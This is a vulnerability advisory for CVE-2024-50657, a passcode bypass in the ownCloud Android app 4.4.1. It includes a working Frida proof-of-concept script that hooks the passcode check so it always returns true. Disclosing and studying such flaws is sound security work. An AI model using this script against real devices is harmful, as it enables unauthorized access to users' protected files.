# CVE-2024-50657:Incorrect Access Control on Owncloud apk
 An issue in Owncloud android apk v.4.4.1 allows a physically proximate attacker to escalate privileges via the PassCodeViewModel class, specifically in the checkPassCodeIsValid method.

# Vulnerability Type
 Incorrect Access Control
 
# Vendor of Product
 Owncloud
 
# Affected Product Code Base
 Owncloud android apk - 4.4.1

# Affected Component
com.owncloud.android.presentation.security.passcode.PassCodeViewModel

# Exploitation
  
# Identify the Target Class and Method:

> The PassCodeViewModel class in the application manages the logic for passcode verification.
> The checkPassCodeIsValid method within this class is responsible for determining the validity of the entered passcode.

 # Hook the Method Using Frida:

> A Frida script is used to hook into the checkPassCodeIsValid method in the PassCodeViewModel class.
> The method's implementation is altered to always return true, bypassing the actual passcode validation.

# Execution:

> The Frida script is executed while the app is running.
> Any passcode input by the user will be accepted as valid, allowing unauthorized access.
# PoC

 Java.perform(function() {
 // Locate the PassCodeViewModel class in the target application
 var PassCodeActivity = Java.use('com.owncloud.android.presentation.security.passcode.PassCodeViewModel');

 // Hook the checkPassCodeIsValid method to modify its behavior
 PassCodeActivity.checkPassCodeIsValid.implementation = function(passcode) {
 
  // Bypass the actual passcode check by always returning true
     return true;
   
 };

 });

Video POC Link : https://drive.google.com/drive/folders/1C-ZYjYhmKRGvWs9YN51XOiAS2WxxwdQd?usp=sharing
# Impact:-
 This vulnerability is a client-side security bypass vulnerability. It affects users of the application who rely on the passcode feature to protect sensitive data or restrict access to certain app functionalities. By exploiting this vulnerability, an attacker can bypass the passcode check and gain unauthorized access to areas of the app that should be protected, potentially exposing user data or allowing unauthorized actions within the app.

